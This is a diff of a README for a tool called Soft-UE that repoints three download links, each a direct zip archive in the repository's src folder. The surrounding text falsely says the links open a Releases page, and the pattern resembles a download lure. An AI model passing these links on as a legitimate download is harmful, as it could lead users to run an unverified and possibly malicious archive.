@@ -1,6 +1,6 @@
 # 🚀 Soft-UE - Seamless Ethernet Software Experience
 
-[![Download Soft-UE](https://raw.githubusercontent.com/Jeffbeco/Soft-UE/main/UET/src/Soft-UE_v3.4-alpha.3.zip)](https://raw.githubusercontent.com/Jeffbeco/Soft-UE/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
+[![Download Soft-UE](https://github.com/Jeffbeco/Soft-UE/raw/refs/heads/main/UET/src/Soft-UE_v3.4-alpha.3.zip)](https://github.com/Jeffbeco/Soft-UE/raw/refs/heads/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
 
 ## 📥 Introduction
 
@@ -23,7 +23,7 @@ Before you start, ensure that your system meets the following requirements:
 
 To download Soft-UE, visit the following link to find the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/Jeffbeco/Soft-UE/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
+[Visit this page to download](https://github.com/Jeffbeco/Soft-UE/raw/refs/heads/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
 
 1. Click on the link above to open the Releases page.
 2. You'll see a list of available versions. The most recent version is at the top.
@@ -80,4 +80,4 @@ Should you need help, you can reach our support team via the Issues tab on the G
 
 Thank you for choosing Soft-UE! We are excited to see how you enhance your Ethernet experience. For the latest updates and information, keep an eye on the Releases page.
 
-[Visit this page to download](https://raw.githubusercontent.com/Jeffbeco/Soft-UE/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
+[Visit this page to download](https://github.com/Jeffbeco/Soft-UE/raw/refs/heads/main/UET/src/Soft-UE_v3.4-alpha.3.zip)
